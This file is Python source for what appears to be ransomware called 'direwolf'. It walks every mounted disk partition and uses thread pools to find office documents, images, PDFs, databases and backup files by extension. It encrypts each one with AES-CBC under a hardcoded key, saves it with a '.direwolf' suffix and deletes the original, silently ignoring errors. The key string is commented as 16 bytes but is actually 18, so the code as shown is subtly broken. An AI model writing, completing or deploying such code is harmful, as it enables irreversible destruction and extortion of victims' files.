import os
import sys
import psutil
import concurrent.futures
from threading import Lock
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

included_extensions = ['.docx', '.xlsx', '.pptx', '.doc', '.xls', '.ppt',
                       '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg',
                       '.txt', '.pdf', '.json', '.csv',
                       '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb',
                       '.sql', '.dbf', '.ndf', '.ldf', '.bak', '.myd', '.frm']

wanted_files = []
lock = Lock()

def pad(data):
    pad_len = AES.block_size - (len(data) % AES.block_size)
    return data + bytes([pad_len]) * pad_len

def encrypt_file(input_file, output_file, key):
    try:
        with open(input_file, 'rb') as f:
            data = f.read()
        if not data:
            return
        data = pad(data)
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(data)
        with open(output_file, 'wb') as f:
            f.write(iv + encrypted)
        os.remove(input_file)
    except Exception as e:
        pass  # Reduce logs for size efficiency

def is_wanted(file_path):
    return os.path.splitext(file_path)[1].lower() in included_extensions

def process_file(full_path):
    try:
        if is_wanted(full_path) and os.path.getsize(full_path) > 0:
            return os.path.abspath(full_path)
    except:
        return None

def scan_directory(root_path, key):
    file_list = []
    for root, _, files in os.walk(root_path, topdown=True):
        for file in files:
            file_list.append(os.path.join(root, file))

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
        futures = {executor.submit(process_file, f): f for f in file_list}
        for future in concurrent.futures.as_completed(futures):
            file_path = future.result()
            if file_path and os.path.isfile(file_path):
                output_file = file_path + ".direwolf"
                with lock:
                    encrypt_file(file_path, output_file, key)
                    wanted_files.append(file_path)

def scan_all_disks():
    key = b"Dire7011537027Wolf"  # 16-byte AES key
    if len(key) != 16:
        return
    partitions = [p.mountpoint for p in psutil.disk_partitions(all=False)]
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(4, len(partitions))) as executor:
        futures = [executor.submit(scan_directory, part, key) for part in partitions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except:
                pass  # Minimize size

if __name__ == "__main__":
    scan_all_disks()
    print(f"Total files encrypted: {len(wanted_files)}")
